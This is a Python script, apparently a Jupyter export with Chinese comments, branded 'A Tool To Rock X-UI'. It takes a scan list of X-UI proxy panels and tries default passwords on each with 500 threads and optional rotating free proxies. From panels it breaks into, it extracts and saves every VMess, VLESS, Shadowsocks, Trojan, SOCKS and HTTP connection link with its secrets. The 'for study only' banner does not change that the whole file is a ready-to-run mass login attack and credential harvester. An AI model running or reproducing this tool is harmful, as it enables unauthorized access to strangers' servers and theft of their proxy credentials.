#!/usr/bin/env python
# coding: utf-8

# In[ ]:


import os
from datetime import datetime
import requests
import csv
from concurrent.futures import ThreadPoolExecutor
from urllib3.exceptions import InsecureRequestWarning
import urllib3
import json
from urllib.parse import urlparse, urlencode, quote
import chardet
from threading import Lock, current_thread
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from bs4 import BeautifulSoup
import random
import base64

# 禁用 InsecureRequestWarning 警告
urllib3.disable_warnings(InsecureRequestWarning)

# 请求头信息
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
}

# 弱密码信息
USERNAME_LIST = ['admin', 'root','abc123','username']
PASSWORD_LIST = ['admin', '123456','abc123+','666666', '888888','password', 'admin123','12345678','root123']            

# 锁对象，用于线程安全的文件写入和计数
write_lock = Lock()
counter_lock = Lock()
counter = 0

# 自定义重试配置
RETRY_TIMES = 3
RETRY_BACKOFF_FACTOR = 0.3


# 获取代理池
def fetch_proxies():
    url = 'https://free-proxy-list.net/'
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    table = soup.find('table')
    rows = table.find_all('tr')

    proxies = []

    for row in rows:
        cols = row.find_all('td')
        if cols:
            ip_address = cols[0].text.strip()
            port = cols[1].text.strip()
            https = cols[6].text.strip()

            # 根据https字段决定协议
            protocol = 'https' if https == 'yes' else 'http'

            # 将代理信息添加到列表中
            proxies.append((protocol, ip_address, int(port)))

    # 检查代理的可用性
    valid_proxies = []
    for proxy in proxies:
        protocol, ip, port = proxy
        try:
            response = requests.get('https://httpbin.org/ip', proxies={protocol: f"{protocol}://{ip}:{port}"},
                                    timeout=5)
            if response.status_code == 200:
                valid_proxies.append(proxy)
        except:
            continue

    return valid_proxies


# 创建带有重试机制和代理的会话
def create_session(proxy=None):
    session = requests.Session()
    retries = Retry(
        total=RETRY_TIMES,
        backoff_factor=RETRY_BACKOFF_FACTOR,
        status_forcelist=[500, 502, 503, 504]
    )
    adapter = HTTPAdapter(max_retries=retries)
    session.mount('http://', adapter)
    session.mount('https://', adapter)

    if proxy:
        protocol, ip, port = proxy
        session.proxies = {protocol: f"{protocol}://{ip}:{port}"}

    return session


# 检测单个链接的弱密码
def check_weak_password(link, csv_writer, total_links, proxies, use_proxies):
    global counter
    proxy = random.choice(proxies) if use_proxies and proxies else None
    session = create_session(proxy)
    url = link + "/login"
    weak_password_found = False  # 标志变量
    max_retries = 3  # 最大重试次数
    retries = 0

    while retries < max_retries:
        try:
            for username in USERNAME_LIST:
                if weak_password_found:
                    break
                for password in PASSWORD_LIST:
                    if weak_password_found:
                        break
                    data = {
                        "username": username,
                        "password": password
                    }

                    response = session.post(url, headers=HEADERS, data=data, verify=False, timeout=10)
                    if response.status_code == 200 and '"success":true' in response.text:
                        print(f"[!!!]Weak password detected: {link}")
                        weak_password_found = True  # 设置标志变量
                        location = get_country_code(link)
                        v2ray_links = extract_v2ray_links(session, link)
                        v2ray_links = {protocol: "\n".join(links) if links else "" for protocol, links in
                                       v2ray_links.items()}

                        with write_lock:
                            csv_writer.writerow(
                                {'link': link, 'location': location, 'username': username, 'password': password,
                                 'vmess': v2ray_links['vmess'], 'vless': v2ray_links['vless'],
                                 'shadowsocks': v2ray_links['shadowsocks'], 'socks': v2ray_links['socks'],
                                 'trojan': v2ray_links['trojan'],
                                 'http': v2ray_links['http'], 'other': v2ray_links['other']})

            break
        except (requests.Timeout, requests.RequestException):
            print(f"Error accessing {link} with proxy {proxy}. Retrying...")
            retries += 1
            proxy = random.choice(proxies) if use_proxies and proxies else None
            session = create_session(proxy)

    with counter_lock:
        counter += 1
        print(f"Thread {current_thread().name} processed {counter}/{total_links} links")


def gen_vmess_link(data, address=''):
    settings = json.loads(data['settings'])
    stream = json.loads(data['streamSettings'])

    remark = data['remark']
    network = stream['network']

    # 初始化参数
    type_ = 'none'
    host = ''
    path = ''

    # 处理不同网络类型
    if network == 'tcp':
        tcp = stream.get('tcpSettings', {})
        type_ = tcp.get('type', 'none')
        if type_ == 'http':
            request = tcp.get('request', {})
            path = ','.join(request.get('path', []))
            headers = request.get('headers', [])
            for header in headers:
                if header.get('name', '').lower() == 'host':
                    host = header['value']
                    break

    elif network == 'kcp':
        kcp = stream.get('kcpSettings', {})
        type_ = kcp.get('type', 'none')
        path = kcp.get('seed', '')

    elif network == 'ws':
        ws = stream.get('wsSettings', {})
        path = ws.get('path', '')
        headers = ws.get('headers', [])
        for header in headers:
            if header.get('name', '').lower() == 'host':
                host = header['value']
                break

    elif network == 'http':
        network = 'h2'  # HTTP 转换为 h2
        http = stream.get('httpSettings', {})
        path = http.get('path', '')
        host = ','.join(http.get('host', []))

    elif network == 'quic':
        quic = stream.get('quicSettings', {})
        type_ = quic.get('type', 'none')
        host = quic.get('security', '')
        path = quic.get('key', '')

    elif network == 'grpc':
        grpc = stream.get('grpcSettings', {})
        path = grpc.get('serviceName', '')

    # TLS 处理
    if stream.get('security') == 'tls':
        tls_server = stream.get('tlsSettings', {}).get('serverName', '')
        if tls_server:
            address = tls_server

    # 增强 remark
    vmess_settings = settings['clients'][0]
    if vmess_settings.get('email', ''):
        remark = f"{remark}|{vmess_settings['email']}"
    if vmess_settings.get('traffic', 0) > 0:
        remark = f"{remark}|{vmess_settings['traffic']}GB"
    if vmess_settings.get('expiry', 0) > 0:
        # 假设 expiry 是 Unix 时间戳，转换为可读日期
        expiry_date = datetime.fromtimestamp(vmess_settings['expiry']).strftime('%Y-%m-%d')
        remark = f"{remark}|{expiry_date}"

    # 构造 Vmess 对象
    vmess_obj = {
        'v': '2',
        'ps': remark,
        'add': address,
        'port': data['port'],
        'id': vmess_settings['id'],
        'aid': vmess_settings['alterId'],
        'net': network,
        'type': type_,
        'host': host,
        'path': path,
        'tls': stream.get('security', '')
    }

    # JSON 序列化并 base64 编码
    vmess_json = json.dumps(vmess_obj, ensure_ascii=False)
    vmess_b64 = base64.b64encode(vmess_json.encode('utf-8')).decode('utf-8')

    return f"vmess://{vmess_b64}"


def gen_vless_link(data, address):
    settings = json.loads(data['settings'])
    stream = json.loads(data['streamSettings'])

    remark = data['remark'] + '|' + settings['clients'][0]['email'] if settings['clients'][0].get('email') else data[
        'remark']
    uuid = settings['clients'][0]['id']
    port = data['port']
    type = stream['network']

    # 初始化参数
    params = {"type": type}
    xtls = data.get('xtls', False)

    # 设置基础安全参数
    security = stream.get('security', 'none')
    params['security'] = 'xtls' if xtls else security

    # 处理不同网络类型
    if type == "tcp":
        tcp = stream.get('tcpSettings', {})
        if tcp.get('type') == 'http':
            request = tcp.get('request', {})
            params["path"] = ','.join(request.get('path', []))
            headers = request.get('headers', [])
            for header in headers:
                if header.get('name', '').lower() == 'host':
                    params["host"] = header['value']
                    break

    elif type == "kcp":
        kcp = stream.get('kcpSettings', {})
        params["headerType"] = kcp.get('type')
        params["seed"] = kcp.get('seed')

    elif type == "ws":
        ws = stream.get('wsSettings', {})
        params["path"] = ws.get('path')
        headers = ws.get('headers', [])
        for header in headers:
            if header.get('name', '').lower() == 'host':
                params["host"] = header['value']
                break

    elif type == "http":
        http = stream.get('httpSettings', {})
        params["path"] = http.get('path')
        params["host"] = http.get('host')

    elif type == "quic":
        quic = stream.get('quicSettings', {})
        params["quicSecurity"] = quic.get('security')
        params["key"] = quic.get('key')
        params["headerType"] = quic.get('type')

    elif type == "grpc":
        grpc = stream.get('grpcSettings', {})
        params["serviceName"] = grpc.get('serviceName')

    # TLS 处理
    if security == 'tls':
        tls_settings = stream.get('tlsSettings', {})
        tls_server = tls_settings.get('serverName')
        if tls_server:
            address = tls_server
            params['sni'] = address

        # 检查flow是否为xtls-rprx-vision
        flow = settings['clients'][0].get('flow', '')
        if flow == 'xtls-rprx-vision':
            params['flow'] = flow

        # 设置fingerprint
        fingerprint = settings['clients'][0].get('fingerprint')
        if fingerprint:
            params['fp'] = fingerprint

    # XTLS 处理
    if xtls:
        params['flow'] = settings['clients'][0].get('flow', '')

    # Reality 处理
    if security == 'reality':
        reality_settings = stream.get('realitySettings', {})
        server_name = reality_settings.get('serverNames', '')[0]
        if server_name:
            params['sni'] = server_name

        # 设置publicKey
        public_key = reality_settings.get('publicKey', '')
        if public_key:
            params['pbk'] = public_key

        # 如果是tcp网络类型，设置flow和fingerprint
        if stream['network'] == 'tcp':
            params['flow'] = settings['clients'][0].get('flow', '')
            fingerprint = settings['clients'][0].get('fingerprint')
            if fingerprint:
                params['fp'] = fingerprint

    base_url = f"vless://{uuid}@{address}:{port}"
    query_string = urlencode({k: v for k, v in params.items()})
    full_url = f"{base_url}?{query_string}#{quote(remark)}" if remark else f"{base_url}?{query_string}"

    return full_url


def gen_ss_link(data, address=''):
    settings = json.loads(data['settings'])
    stream = json.loads(data['streamSettings'])
    remark = data['remark']

    # 检查 TLS server 是否存在
    server = stream.get('tls', {}).get('server', '')
    if server:
        address = server

    # Shadowsocks 的 method:password 部分需要 base64 编码
    auth_str = f"{settings['method']}:{settings['password']}"
    auth_b64 = base64.b64encode(auth_str.encode('utf-8')).decode('utf-8')

    # 构造 SS URL
    base_url = f"ss://{auth_b64}@{address}:{data['port']}"
    full_url = f"{base_url}#{quote(remark)}" if remark else base_url

    return full_url


def gen_trojan_link(data, address=''):
    settings = json.loads(data['settings'])
    remark = quote(data['remark'])

    # Trojan URL 构造
    password = settings['clients'][0]['password']
    base_url = f"trojan://{password}@{address}:{data['port']}"
    full_url = f"{base_url}#{quote(remark)}" if remark else base_url

    return full_url


def gen_socks_or_http_link(data, hostname):
    settings = json.loads(data['settings'])
    protocol = data['protocol']
    if protocol not in ["socks", "http"]:
        return
    port = data['port']
    remark = data['remark'] if data['remark'] else f"{hostname}-{port}"

    auth = ''
    if settings['auth'] != 'noauth':
        username = settings['accounts'][0]['user']
        password = settings['accounts'][0]['pass']
        if username and password:
            auth = f"{username}:{password}"
        elif username:
            auth = f"{username}"
        # 如果您的客户端对于socks URL中的用户名与密码无需base64编码，请将下面两行注释掉
        if protocol == "socks":
            auth = base64.b64encode(auth.encode()).decode()
        auth += "@"

    return f"{protocol}://{auth}{hostname}:{port}#{quote(remark)}"


# 提取 v2ray 链接
def extract_v2ray_links(session, link):
    v2ray_links = {
        "vmess": [],
        "vless": [],
        "shadowsocks": [],
        "trojan": [],
        "socks": [],
        "http": [],
        "other": []
    }
    try:
        response = session.post(link + "/xui/inbound/list", headers=HEADERS, verify=False, timeout=10)
        data_group = response.json().get('obj', [])
        address = urlparse(link).hostname
        for item in data_group:
            protocol = item['protocol']
            if protocol == "vmess":
                v2ray_links[protocol].append(gen_vmess_link(item, address))
            elif protocol == "vless":
                v2ray_links[protocol].append(gen_vless_link(item, address))
            elif protocol == "shadowsocks":
                v2ray_links[protocol].append(gen_ss_link(item, address))
            elif protocol == "trojan":
                v2ray_links[protocol].append(gen_trojan_link(item, address))
            elif protocol in {"socks", "http"}:
                v2ray_links[protocol].append(gen_socks_or_http_link(item, address))
            else:
                v2ray_links["other"].append("Unable to parse: " + protocol)

        print(f"\nExtracted V2Ray links from {link}:")
    except Exception as e:
        print(f"Error extracting v2ray links from {link}: {e}")

    return v2ray_links


# 检测文件编码，因为如果修改fofa导出csv后，会有格式变化
def detect_file_encoding(file_path):
    with open(file_path, 'rb') as f:
        raw_data = f.read()
        result = chardet.detect(raw_data)
        return result['encoding']


# 读取 CSV 并提取链接
def read_links_from_csv(file_path):
    encoding = detect_file_encoding(file_path)
    links = []
    with open(file_path, newline='', encoding=encoding) as csvfile:
        reader = csv.DictReader(csvfile)
        for row in reader:
            links.append(row['link'])
    return links


# GET IP LOCATION
def get_country_code(link):
    try:
        ip = urlparse(link).hostname

        response = requests.get(f"https://get.geojs.io/v1/ip/geo/{ip}.json")
        response.raise_for_status()  # 如果状态码不是200，抛出异常
        location_data = response.json()

        # 获取国家代码
        country_code = location_data.get("country_code")
        return country_code
    except (requests.exceptions.RequestException, ValueError, AttributeError) as e:
        print(f"获取国家代码时出错: {e}")
        return None


def main(csv_file, num_threads, use_proxies):
    links = read_links_from_csv(csv_file)
    total_links = len(links)
    proxies = fetch_proxies() if use_proxies else []  # 获取代理池
    with open('weak_password_links.csv', 'w', newline='', encoding='utf-8',
              buffering=1) as csvfile:
        fieldnames = ['link', 'location', 'username', 'password', 'vmess', 'vless', 'shadowsocks', 'trojan', 'socks',
                      'http',
                      'other']
        csv_writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
        csv_writer.writeheader()

        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            executor.map(lambda link: check_weak_password(link, csv_writer, total_links, proxies, use_proxies), links)


if __name__ == "__main__":
    while True:
        filename_input = input("请输入同一目录下X-UI扫描结果的csv文件名(可省略.csv): ").strip()
        # 如果输入已包含.csv，则直接使用；否则添加.csv
        xui_filename = f"{filename_input}"
        if not xui_filename.endswith('.csv'):
            xui_filename += '.csv'
        if os.path.isfile(xui_filename):
            break
        # 如果添加.csv后不存在，尝试去掉用户输入的.csv再加.csv（处理用户输入错误后缀的情况）
        if filename_input.endswith('.csv'):
            xui_filename = f"{filename_input[:-4]}.csv"
            if os.path.isfile(xui_filename):
                break
        print(f"文件 {xui_filename} 不存在，请重新输入")

    num_threads = 500  # 设置默认值
    thread_input = input("请输入线程数(直接回车使用默认值500): ").strip()
    if thread_input:  # 如果用户输入了值
        while True:
            try:
                num_threads = int(thread_input)
                if num_threads > 0:
                    break
                print("线程数必须为正整数，请重新输入")
            except ValueError:
                print("请输入有效的数字")
                thread_input = input("请输入线程数(直接回车使用默认值500): ").strip()
                if not thread_input:  # 如果再次输入为空则使用默认值
                    num_threads = 500
                    break

    if_use_proxies = input("是否使用代理(可能会减慢速度),(Y/N,默认N): ").strip().lower()
    use_proxies = 1 if if_use_proxies == 'y' else 0  # 空输入或'n'都保持默认0
    print(f"线程数设置为: {num_threads}")
    print("将会使用代理" if use_proxies else "将会不使用代理")

print("-----------------------------------------------------------------------------")
print("  #   #         #  #   ###           ###     ##     ##    #  #   ####   ### ")
print("   # #          #  #    #            #  #   #  #   #  #   # #    #      #  # ")
print("    #           #  #    #            #  #   #  #   #      ##     ###    #  # ")
print("   # #   #####  #  #    #            ###    #  #   #      # #    #      ### ")
print("   # #          #  #    #            #  #   #  #   #  #   #  #   #      #  # ")
print("  #   #          ##    ###           #  #    ##     ##    #  #   ####   #  # ")
print("-----------------------------------------------------------------------------")
print("                                                          A Tool To Rock X-UI")
print("                                                FOR STUDY AND EDUCATE ONLY!!!")
print("                                                                 Version 3.02")
main(xui_filename, num_threads=num_threads, use_proxies=use_proxies)

